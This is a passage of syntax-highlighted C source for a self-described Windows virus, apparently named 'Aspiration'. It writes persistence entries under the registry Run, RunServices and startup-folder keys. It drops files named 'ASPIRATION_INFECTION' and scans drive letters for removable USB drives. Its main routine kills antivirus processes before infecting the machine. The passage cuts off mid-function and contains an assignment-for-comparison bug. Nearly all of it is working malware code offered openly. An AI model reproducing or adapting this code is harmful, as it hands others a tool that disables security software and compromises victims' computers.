    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aspiration"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"destiny"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"suicide"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"carnage"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"suicide"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"carnage"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aspiration"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"destiny"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"suicide"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"carnage"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Interesting here: Set the startup folder value to a folder we created and where our virus has been copied to */</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Common Startup"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Startup"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Writing the two text files and saving them to the program files folder */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WriteLetters</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szProgramFiles</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_PROGRAM_FILES</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProgramFiles</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">chdir</span><span class="sc10">(</span><span class="sc11">szProgramFiles</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"ASPIRATION_INFECTION.txt"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szTextFile1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szTextFile1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"FOR_AV_SECURITY_COMPANIES.txt"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szTextFile2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szTextFile2</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Writing the two html files and saving them to %windir%\system32 and %windir% */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WriteHTML</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">chdir</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"ASPIRATION_INFECTION.html"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szHTMLFile1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szHTMLFile1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">chdir</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc6">"ASPIRATION_INFECTION.html"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szHTMLFile2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szHTMLFile2</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* An array of possible drive letter, not including " a: " and " b: " as they could be a floppy drive, which we don't like to have */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">drives</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc6">"c:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"d:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"e:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"f:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"g:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"h:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"i:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"j:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"k:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"l:"</span><span class="sc10">,</span><span class="sc0">
                   </span><span class="sc6">"m:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"n:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"o:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"p:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"q:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"r:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"s:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"t:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"u:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"v:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"w:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"x:"</span><span class="sc10">,</span><span class="sc0">
                   </span><span class="sc6">"y:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* Test the computer for a connected USB flash drive by using the array above */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsItUSB</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">drives</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">drType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDriveType</span><span class="sc10">(</span><span class="sc11">drives</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">drType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_REMOVABLE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* ############################################################################################### */</span><span class="sc0">
</span><span class="sc1">/* --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- */</span><span class="sc0">
</span><span class="sc1">/* ############################################################################################### */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PSTR</span><span class="sc0"> </span><span class="sc11">szCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bInfected</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szPersonalFolderPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szProgramFilesPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDirHTML</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDirHTML</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szFileTXT1</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szFileTXT2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Kill all the processes of the array " AVProcessList " */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">AVProcessList</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">KillProcess</span><span class="sc10">(</span><span class="sc11">AVProcessList</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* Test if the computer is infected with our virus */</span><span class="sc0">
    </span><span class="sc11">bInfected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TestIfInfected</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc1">/* If the computer is not infected -&gt; infect it and write all the necessary files and registry keys */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bInfected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">Infect</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">InfRegCopy</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">WriteLetters</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">WriteHTML</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDirHTML</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDirHTML</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDirHTML</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDirHTML</span><span class="sc10">));</span><span class="sc0">

        </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDirHTML</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\ASPIRATION_INFECTION.html"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDirHTML</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\ASPIRATION_INFECTION.html"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">SHGetFolderPath</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CSIDL_PROGRAM_FILES</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SHGFP_TYPE_CURRENT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProgramFilesPath</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szFileTXT1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProgramFilesPath</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szFileTXT2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szProgramFilesPath</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szFileTXT1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\ASPIRATION_INFECTION.txt"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szFileTXT2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\FOR_AV_SECURITY_COMPANIES.txt"</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* Use Internet Explorer to open the two html files */</span><span class="sc0">
